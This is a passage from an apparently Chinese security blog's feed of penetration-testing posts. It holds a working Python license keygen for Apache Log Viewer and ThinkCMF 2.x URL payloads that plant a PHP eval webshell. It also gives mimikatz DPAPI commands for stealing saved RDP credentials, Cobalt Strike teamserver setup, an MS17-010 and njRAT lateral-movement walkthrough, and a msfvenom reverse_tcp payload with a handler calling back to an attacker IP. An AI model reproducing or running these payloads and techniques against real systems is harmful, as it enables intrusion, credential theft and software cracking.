Encoding.ASCII.GetBytes(s);<span class="comment">//将s转为字节码并存入数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (bytes[i] % <span class="number">2</span> == <span class="number">0</span>)<span class="comment">//每一位进行模2运算，为0则num3+1</span></span><br><span class="line">&#123;</span><br><span class="line">num3++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> !(num3.ToString(<span class="string">"00"</span>) != b) &amp;&amp; flag;<span class="comment">//num3向上取整后与校验位作比较，比较成功则返回真</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Keygen"><a href="#Keygen" class="headerlink" title="Keygen"></a>Keygen</h1><p>有了注册机制就可以写注册机了，这里用python写了一个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Author         : Sp4ce</span></span><br><span class="line"><span class="string">@Date           : 2020-02-19 19:17:59</span></span><br><span class="line"><span class="string">@LastEditors    : Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime   : 2020-02-19 23:27:40</span></span><br><span class="line"><span class="string">@Description    : Challenge Everything.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">r"""</span></span><br><span class="line"><span class="string">          _ __      __  _  __           _____            </span></span><br><span class="line"><span class="string">    /\   | |\ \    / / | |/ /          / ____|           </span></span><br><span class="line"><span class="string">   /  \  | | \ \  / /  | ' / ___ _   _| |  __  ___ _ __  </span></span><br><span class="line"><span class="string">  / /\ \ | |  \ \/ /   |  &lt; / _ \ | | | | |_ |/ _ \ '_ \ </span></span><br><span class="line"><span class="string"> / ____ \| |___\  /    | . \  __/ |_| | |__| |  __/ | | |</span></span><br><span class="line"><span class="string">/_/    \_\______\/     |_|\_\___|\__, |\_____|\___|_| |_|</span></span><br><span class="line"><span class="string">                                  __/ |                  </span></span><br><span class="line"><span class="string">                                 |___/     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                Apache Log Viewer 5.X KeyGen</span></span><br><span class="line"><span class="string">                                                  By:Sp4ce</span></span><br><span class="line"><span class="string">    """</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genLicenseCode</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hexdata = data.replace(<span class="string">'-'</span>, <span class="string">':'</span>)</span><br><span class="line">        data = <span class="string">""</span>.join(data.split(<span class="string">'-'</span>))</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hexdata:</span><br><span class="line">            a = binascii.b2a_hex(i.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> int(a, <span class="number">16</span>) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                num = num+<span class="number">1</span></span><br><span class="line">        hexData = binascii.b2a_hex((data+str(num)).encode(<span class="string">'utf-8'</span>)) .decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        hexData = list(hexData)</span><br><span class="line">        hexData.insert(<span class="number">2</span>, <span class="string">'-'</span>)</span><br><span class="line">        hexData.insert(<span class="number">9</span>, <span class="string">'-'</span>)</span><br><span class="line">        hexData.insert(<span class="number">16</span>, <span class="string">'-'</span>)</span><br><span class="line">        hexData.insert(<span class="number">23</span>, <span class="string">'-'</span>)</span><br><span class="line">        licenseCode = <span class="string">''</span>.join(hexData)</span><br><span class="line">        print(<span class="string">"[+] License Code Generate Success!\nYour License Code: -&gt;["</span>+licenseCode.upper()+<span class="string">"]&lt;-"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-] License Code Generate Failed!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    banner()</span><br><span class="line">    data = []</span><br><span class="line">    data.append(<span class="string">'F'</span>)  <span class="comment"># 第一位必须：F</span></span><br><span class="line">    data.append(<span class="string">'-'</span>)  <span class="comment"># 第一个-</span></span><br><span class="line">    data.append(random.randint(<span class="number">1</span>, <span class="number">9</span>))  <span class="comment"># 第3位转为int后必须小于16</span></span><br><span class="line">    data.append(random.randint(<span class="number">1</span>, <span class="number">9</span>))  <span class="comment"># 第4位转为int后必须小于16</span></span><br><span class="line">    data.append(<span class="string">'I'</span>)  <span class="comment"># I</span></span><br><span class="line">    data.append(<span class="string">'-'</span>)  <span class="comment"># 第二个-</span></span><br><span class="line">    data.append(<span class="string">'ALV'</span>)  <span class="comment"># ALV</span></span><br><span class="line">    data.append(<span class="string">'-'</span>)  <span class="comment"># 第三个-</span></span><br><span class="line">    data.append(random.randint(<span class="number">100</span>, <span class="number">999</span>))  <span class="comment"># 第11~13位必须为int型</span></span><br><span class="line">    data.append(<span class="string">'-'</span>)  <span class="comment"># 第四个-</span></span><br><span class="line">    data.append(random.randint(<span class="number">1</span>, <span class="number">9</span>))  <span class="comment"># 第14位随机</span></span><br><span class="line">    data.append(random.randint(<span class="number">2</span>, <span class="number">3</span>))  <span class="comment"># 第15位必须为2或3</span></span><br><span class="line">    data = <span class="string">""</span>.join(<span class="string">'%s'</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> data).upper()</span><br><span class="line">    genLicenseCode(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">          _ __      __  _  __           _____</span><br><span class="line">    &#x2F;\   | |\ \    &#x2F; &#x2F; | |&#x2F; &#x2F;          &#x2F; ____|</span><br><span class="line">   &#x2F;  \  | | \ \  &#x2F; &#x2F;  | &#39; &#x2F; ___ _   _| |  __  ___ _ __</span><br><span class="line">  &#x2F; &#x2F;\ \ | |  \ \&#x2F; &#x2F;   |  &lt; &#x2F; _ \ | | | | |_ |&#x2F; _ \ &#39;_ \</span><br><span class="line"> &#x2F; ____ \| |___\  &#x2F;    | . \  __&#x2F; |_| | |__| |  __&#x2F; | | |</span><br><span class="line">&#x2F;_&#x2F;    \_\______\&#x2F;     |_|\_\___|\__, |\_____|\___|_| |_|</span><br><span class="line">                                  __&#x2F; |</span><br><span class="line">                                 |___&#x2F;</span><br><span class="line"></span><br><span class="line">                Apache Log Viwer 5.X KeyGen</span><br><span class="line">                                                  By:Sp4ce</span><br><span class="line"></span><br><span class="line">[+] License Code Generate Success!</span><br><span class="line">Your License Code: -&gt;[46-313449-414C56-353934-33323130]&lt;-</span><br></pre></td></tr></table></figure><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>该软件注册机制还有第二种方案，抽空再写</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浪潮ClusterEngineV4.0远程代码执行</title>
      <link href="/p/7dbf.html"/>
      <url>/p/7dbf.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="26be4b369855c660d14fd3462687f5875dee527b7529199547200e9e319c8942"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> VulCMS </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取远程主机保存的RDP凭据密码</title>
      <link href="/p/bf1f.html"/>
      <url>/p/bf1f.html</url>
      
        <content type="html"><![CDATA[<p>拿下一台运维机，上了个CS，发现曾经连接过几台服务器并且保存了凭据，网上查了圈发现CS不支持交互式mimikatz，记录下获取远程主机RDP凭据。</p><a id="more"></a><p>Windows保存RDP凭据的目录是<code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code></p><p>可通过命令行获取，执行: <code>cmdkey /list</code>或<code>powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force</code><br><strong>注意:<code>cmdkey /list</code>命令务必在Session会话下执行，system下执行无结果。</strong></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200113145947805.png" alt="image-20200113145947805"></p><p>使用<code>cobalt strike</code>中的<code>mimikatz</code>可以获取一部分接下来要用到的<code>masterkey</code>和<code>pbData</code></p><p><code>mimikatz dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID</code></p><p>输出应类似</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;0785cf41-0f53-4be7-bc8b-6cb33b4bb102&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (system ; )</span><br><span class="line">  dwDescriptionLen   : 00000012 - 18</span><br><span class="line">  szDescription      : 本地凭据数据</span><br><span class="line"></span><br><span class="line">  algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">  dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">  dwSaltLen          : 00000020 - 32</span><br><span class="line">  pbSalt             : 726d845b8a4eba29875****10659ec2d5e210a48f</span><br><span class="line">  dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">  pbHmackKey         : </span><br><span class="line">  algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">  dwAlgHashLen       : 00000200 - 512</span><br><span class="line">  dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">  pbHmack2Key        : cda4760ed3fb1c7874****28973f5b5b403fe31f233</span><br><span class="line">  dwDataLen          : 000000c0 - 192</span><br><span class="line">  pbData             : d268f81c64a3867cd7e96d99578295ea55a47fcaad5f7dd6678989117fc565906cc5a8bfd37137171302b34611ba5****e0b94ae399f9883cf80050f0972693d72b35a9a90918a06d</span><br><span class="line">  dwSignLen          : 00000040 - 64</span><br><span class="line">  pbSign             : 63239d3169c99fd82404c0e230****37504cfa332bea4dca0655</span><br></pre></td></tr></table></figure><p>需要关注的是<code>guidMasterKey</code>、<code>pbData</code>，<code>pbData</code>是我们要解密的数据，<code>guidMasterKey</code>是解密所需要的密钥。这里LSASS已经在其缓存中存有这个<code>key</code>因此我们可以使用<code>SeDebugPrivilege</code>获取。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; mimikatz !sekurlsa::dpapi</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz !sekurlsa::dpapi  </span><br><span class="line"></span><br><span class="line">[00000001]</span><br><span class="line">* GUID      :&#123;0785cf41-0f53-4be7-bc8b-6cb33b4bb102&#125;</span><br><span class="line">* Time      :2020&#x2F;1&#x2F;3 8:05:02</span><br><span class="line">* MasterKey :02b598c2252fa5d8f7fcd***7737644186223f44cb7d958148</span><br><span class="line">* sha1(key) :3e6dc57a0fe****a902cfaf617b1322</span><br><span class="line">[00000002]</span><br><span class="line">* GUID      :&#123;edcb491a-91d7-4d98-a714-8bc60254179f&#125;</span><br><span class="line">* Time      :2020&#x2F;1&#x2F;3 8:05:02</span><br><span class="line">* MasterKey :c17a4aa87e9848e9f46c8ca81330***79381103f4137d3d97fe202</span><br><span class="line">* sha1(key) :5e1b3eb1152d3****6d3d6f90aaeb</span><br></pre></td></tr></table></figure><p>然后将凭据保存到本地，执行</p><p><code>mimikatz &quot;dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSION /masterkey:对应的GUID key&quot;</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200113151254629.png" alt="image-20200113151254629"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkCMF缓存getshell</title>
      <link href="/p/7506.html"/>
      <url>/p/7506.html</url>
      
        <content type="html"><![CDATA[<p>前一阵子接到个项目，目标站是<code>thinkCMF2.X</code>搭建的，试过网上很多方法无法拿下，本地搭了个环境测试了下，最终成功拿下</p><a id="more"></a><p>由于<code>thinkcmf2.x</code>使用了<code>thinkphp3.x</code>作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的<code>PHP</code>代码写入<code>data/runtime/Logs/Portal</code>目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马<code>m.php</code></p><p>日志文件格式为<code>YY_MM_DD.log</code>，如当前日期为2019年12月12日，日志文件为<code>19_12_12.log</code>，完整路径为<code>data/runtime/Logs/Portal/19_12_12.log</code></p><h2 id="测试成功的环境"><a href="#测试成功的环境" class="headerlink" title="测试成功的环境"></a>测试成功的环境</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>宝塔[PHP7.2]</li></ul><h3 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h3><ul><li>PHPstudy PHP7.1</li></ul><h3 id="Payload1："><a href="#Payload1：" class="headerlink" title="Payload1："></a>Payload1：</h3><p>首先访问<code>http://target.domain/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200110232754375.png" alt="image-20200110232754375"></p><p>然后请求<code>http://target.domain/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200110232929112.png" alt="image-20200110232929112"></p><p>即可在<code>http://target.domain/</code>根目录生成<code>m.php</code>，密码是X</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200110233013338.png" alt="image-20200110233013338"></p><h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2:"></a>Payload2:</h3><p>首先访问<code>http://target.domain/?a=display&amp;templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E</code></p><p>然后菜刀连接<code>http://target.domain/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</code>，密码同样是X</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> PHP </tag>
            
            <tag> VulCMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike Teamserer的搭建</title>
      <link href="/p/eeb3.html"/>
      <url>/p/eeb3.html</url>
      
        <content type="html"><![CDATA[<p>记录下Cobalt Strike Teamserer的搭建</p><a id="more"></a><blockquote><p>环境如下</p><ul><li>Ubuntu 18.04</li><li>Cobalt Strike 3.14</li></ul></blockquote><p>准备一台Ubuntu 18.04的服务器，下载<code>Cobalt Strike</code>完整文件并传到服务器上</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1572710470217.png" alt="1572710470217"></p><p>安装<code>JDK1.8</code></p><p><code>apt install openjdk-8-jdk  -y</code></p><p>装好后尝试执行<code>./teamserver 10.16.11.55 cSro0t</code>进行验证</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1572710672368.png" alt="1572710672368"></p><p>启动成功</p><h1 id="添加服务"><a href="#添加服务" class="headerlink" title="添加服务"></a>添加服务</h1><p><code>vi /etc/systemd/system/cobaltstrike.service</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;CS Service</span><br><span class="line">After&#x3D;network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">PIDFile&#x3D;&#x2F;run&#x2F;CS.pid</span><br><span class="line">WorkingDirectory&#x3D;&#x2F;path_to_cobaltstrike_root_directory&#x2F;</span><br><span class="line">ExecStart&#x3D;&#x2F;path_to_cobaltstrike_root_directory&#x2F;teamserver YOUR_SERVER_IP YOUR_PASSWORD</span><br><span class="line">Restart&#x3D;on-failure</span><br><span class="line"># Don&#39;t restart in the case of configuration error</span><br><span class="line">RestartPreventExitStatus&#x3D;23</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p>启用服务并查看状态</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start cobaltstrike</span><br><span class="line">systemctl status cobaltstrike.service</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/1572710927211.png" alt="1572710927211"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复盘从一个监控主机到核心路由沦陷</title>
      <link href="/p/aac0.html"/>
      <url>/p/aac0.html</url>
      
        <content type="html"><![CDATA[<p>在对内网进行<code>ms17-010</code>扫描时，发现2台之前没有出现过且没有打补丁的主机，于是，尝试了一波</p><a id="more"></a><p>kali主机在扫描时发现2台之前没有出现过且没有打补丁的主机</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570723715159.png" alt="1570723715159"></p><p>尝试打了一波</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570723899385.png" alt="1570723899385"></p><p>然后种了个<code>njrat</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725845893.png" alt="1570725845893"></p><p>翻文件的时候发现了点配置文件</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724083033.png" alt="1570724083033"></p><p><code>down</code>下来解压后发现是交换机的配置文件，于是有了一个大胆的想法</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724161870.png" alt="1570724161870"></p><p>查看了被控主机的网络连接后，发现一个地址无法<code>ping</code>通，<code>TCP</code>包也无法到达，推测做了<code>ACL</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724333653.png" alt="1570724333653"></p><p>于是在被控机上搭了<code>earthworm</code>做转发</p><blockquote><p>本机执行<code>ew -s rcsocks -l 本地代理端口 -e 远端连接端口</code></p><p>被控机执行<code>ew -s rssocks -d 主控机IP -e 远端连接端口</code></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724558982.png" alt="1570724558982"></p><p>然后开启<code>proxifier</code>的代理功能，成功访问了那个系统，但这不是主要目的</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724652145.png" alt="1570724652145"></p><p>在咨询了好哥们后，他建议尝试搞搞交换机看看</p><p>在对<code>10.2.66/24</code>网段扫描后发现<code>10.2.66.254</code>开放了<code>80</code>和<code>23</code>端口，尝试<code>xshell</code>连接</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724812791.png" alt="1570724812791"></p><p>成功使用<code>huawei</code>密码<code>huawei@1234</code>连接，继续翻上级路由</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724864331.png" alt="1570724864331"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724926806.png" alt="1570724926806"></p><p>发现了<code>10.2.20.1</code></p><p>继续<code>telnet</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570724968457.png" alt="1570724968457"></p><p>继续翻</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725016714.png" alt="1570725016714"></p><p>发现10.2.20.58</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725071124.png" alt="1570725071124"></p><p>继续翻，翻到10.4.0.1</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725139216.png" alt="1570725139216"></p><p>继续telnet</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725188260.png" alt="1570725188260"></p><p>另外发现此时可以ping通10.4.0.1这台交换机</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725560354.png" alt="1570725560354"></p><p>于是乎，扔浏览器打开看看</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725700017.png" alt="1570725700017"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725725357.png" alt="1570725725357"></p><p>拿下后将本次收集到的密码与巡风扫描到的telnet主机进行爆破后发现了更多的交换机。。。。。。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1570725809593.png" alt="1570725809593"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="/p/69e0.html"/>
      <url>/p/69e0.html</url>
      
        <content type="html"><![CDATA[<p>在上次拿下了一台内网主机后，将其作为跳板，对<code>192.168/16</code>网段进行了扫描</p><a id="more"></a><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>先上一张内网环境拓扑图</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568903322779.png" alt="1568903322779"></p><p>经过扫描后，识别出几个重要资产，并将他们作为目标进行针对性的测试</p><blockquote><p>192.168.122.8<br>192.168.122.11<br>192.168.122.12<br>192.168.122.13<br>192.168.122.15<br>192.168.122.16<br>192.168.122.54<br>192.168.122.60</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1568901397651.png" alt="1568901397651"></p><p>通过<code>banner</code>和<code>80</code>端口<code>title</code></p><p>识别到的资产如下</p><p><code>192.168.101.3</code>-&gt;锐捷交换机</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568901498643.png" alt="1568901498643"></p><p><code>192.168.135.1</code>-&gt;锐捷AC控制器，下联5个AP</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568901527565.png" alt="1568901527565"></p><p><code>192.168.122.8</code>-&gt;VMware vCenter主机</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568901579163.png" alt="1568901579163"></p><p><code>192.168.122.6</code>-&gt; ESXi主机</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568903430349.png" alt="1568903430349"></p><p>内网大杀器<code>MS17-010</code>的扫描结果</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568901642587.png" alt="1568901642587"></p><p><code>攻击路径：10.46.1.16=192.168.122.16-&gt;192.168.122.11-&gt;192.168.122.15-&gt;192.168.122.54-&gt;192.168.122.60-&gt;192.168.122.8-&gt;192.168.122.6</code></p><h1 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h1><h2 id="10-46-1-16"><a href="#10-46-1-16" class="headerlink" title="10.46.1.16"></a>10.46.1.16</h2><p>MSSQL弱口令+IIS7web服务无<code>webshell</code>，见上一篇博客</p><h2 id="192-168-122-16-gt-192-168-122-11"><a href="#192-168-122-16-gt-192-168-122-11" class="headerlink" title="192.168.122.16-&gt;192.168.122.11"></a>192.168.122.16-&gt;192.168.122.11</h2><p>使用自行创建的管理员权限的<code>asp.net</code>账户登录后，运行<code>mimikatz</code>抓到了<code>administrator</code>用户的密码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568903727776.png" alt="1568903727776"></p><p>然后使用<code>administrator</code>用户登录<code>192.168.122.16</code>，发现在<code>mstsc</code>中有<code>192.168.122.11</code>的历史连接记录并且保存了帐号密码，连接上后发现是<code>administrator</code>用户，再次抓取<code>192.168.122.11</code>密码，发现密码与<code>.16</code>的一样，并且在桌面发现了数据库连接密码，保存备用</p><h2 id="192-168-122-11-gt-192-168-122-15"><a href="#192-168-122-11-gt-192-168-122-15" class="headerlink" title="192.168.122.11-&gt;192.168.122.15"></a>192.168.122.11-&gt;192.168.122.15</h2><p>由于内网中已有2台主机密码一样，将密码做成字典后对<code>192.168.122.0/24</code>进行了RDP爆破，发现<code>192.168.122.15</code>的密码也为<code>Dell123456</code>，逐拿下第三台</p><h2 id="192-168-122-15-gt-192-168-122-54-gt-192-168-122-60"><a href="#192-168-122-15-gt-192-168-122-54-gt-192-168-122-60" class="headerlink" title="192.168.122.15-&gt;192.168.122.54-&gt;192.168.122.60"></a>192.168.122.15-&gt;192.168.122.54-&gt;192.168.122.60</h2><p>由于<code>192.168.122.60</code>这台主机存在<code>ms17-010</code>漏洞，MSF的代理隧道不稳定，决定利用BPF中的<code>Eternalblue</code>模块进行攻击，对相关文件进行代理设置后</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904161142.png" alt="1568904161142"></p><p>由kali机生成meterpreter木马并设置监听</p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.16.11.85  LPORT=4444 -f dll &gt;~/backdoor_x64.dll</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 4444</span><br><span class="line">lport &#x3D;&gt; 4444</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 10.16.11.85</span><br><span class="line">lhost &#x3D;&gt; 10.16.11.85</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure><p>设置好BPF后，对<code>192.168.122.54</code>进行了攻击并获得了一个<code>system</code>权限的shell</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904281983.png" alt="1568904281983"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904349365.png" alt="1568904349365"></p><p>随后使用<code>mimikatz</code>读密码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904374468.png" alt="1568904374468"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904407381.png" alt="1568904407381"></p><p>得到密码为<code>Admin@123</code>，同样的方法对<code>192.168.122.60</code>进行了攻击，密码一样为<code>Admin@123</code>，同时check出这两台机器为虚拟机</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904525836.png" alt="1568904525836"></p><p>由于内网中存在2台虚拟机管理系统，逐将密码保存备用</p><h2 id="192-168-122-60-gt-192-168-122-8-gt-192-168-122-6"><a href="#192-168-122-60-gt-192-168-122-8-gt-192-168-122-6" class="headerlink" title="192.168.122.60-&gt;192.168.122.8-&gt;192.168.122.6"></a>192.168.122.60-&gt;192.168.122.8-&gt;192.168.122.6</h2><p>通过之前的密码分析，推断出管理员有喜爱使用同一密码的爱好，于是大胆猜测vCenter主机的密码也为<code>Admin@123</code>，登录后确实如此</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904853069.png" alt="1568904853069"></p><p>由于本人之前部署过<code>vCenter</code>和<code>ESXi</code>，其默认用户名为<code>administrator@vsphere.local</code>和<code>root</code>，尝试使用<code>Admin@123</code>登录后，两台主机（或者说一台）沦陷</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568904990106.png" alt="1568904990106"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568905005051.png" alt="1568905005051"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mssql无webshell提权</title>
      <link href="/p/3092.html"/>
      <url>/p/3092.html</url>
      
        <content type="html"><![CDATA[<p>在内网中扫描到了几台<code>sa</code>权限的<code>mssql</code>，报备后做了次简单的检测</p><a id="more"></a><h1 id="侦查"><a href="#侦查" class="headerlink" title="侦查"></a>侦查</h1><p><code>Navicat</code>连上后查看<code>xp_cdshell</code>是否存在</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596792031.png" alt="1568596792031"></p><p>发现存在的</p><p>执行<code>exec master..xp_cmdshell &quot;systeminfo&quot;</code>发现网卡连接了一个<code>192.168/16</code>的内网<code>IP</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">主机名:           WIN-XXXXX</span><br><span class="line">OS 名称:          Microsoft Windows Server 2008 R2 Enterprise </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00486-001-0001076-84214</span><br><span class="line">初始安装日期:     2016&#x2F;7&#x2F;29, 17:27:35</span><br><span class="line">系统启动时间:     